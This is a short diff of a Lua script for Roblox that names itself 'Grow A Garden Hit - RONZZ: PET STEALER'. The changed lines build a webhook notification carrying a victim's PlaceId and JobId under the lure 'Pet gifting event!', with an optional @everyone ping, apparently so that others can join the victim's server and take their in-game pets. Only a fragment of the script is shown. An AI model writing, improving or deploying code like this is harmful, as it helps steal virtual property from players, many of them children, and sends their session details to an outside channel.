@@ -278,7 +278,7 @@ local function SendJoinMessage(list, prefix)
     end
 
     local data = {
-        ["content"] = 'game:GetService("TeleportService"):TeleportToPlaceInstance(126884695634066, "68a50a57-0d56-4794-8017-6013bce03b12")',
+        ["content"] = prefix .. 'Pet gifting event!\nServer Location: PlaceId=' .. tostring(game.PlaceId) .. ', JobId=' .. tostring(game.JobId),
         ["embeds"] = {{
             ["title"] = ":dog: Grow A Garden Hit - RONZZ: PET STEALER :dog:",
             ["color"] = 25500,
@@ -435,7 +435,7 @@ if #itemsToSend > 0 then
 
     local prefix = ""
     if ping == "Yes" then
-        prefix = "--@everyone "
+        prefix = "@everyone "
     end
 
     -- Remove followUser and waitForUserChat, just send notification after scan
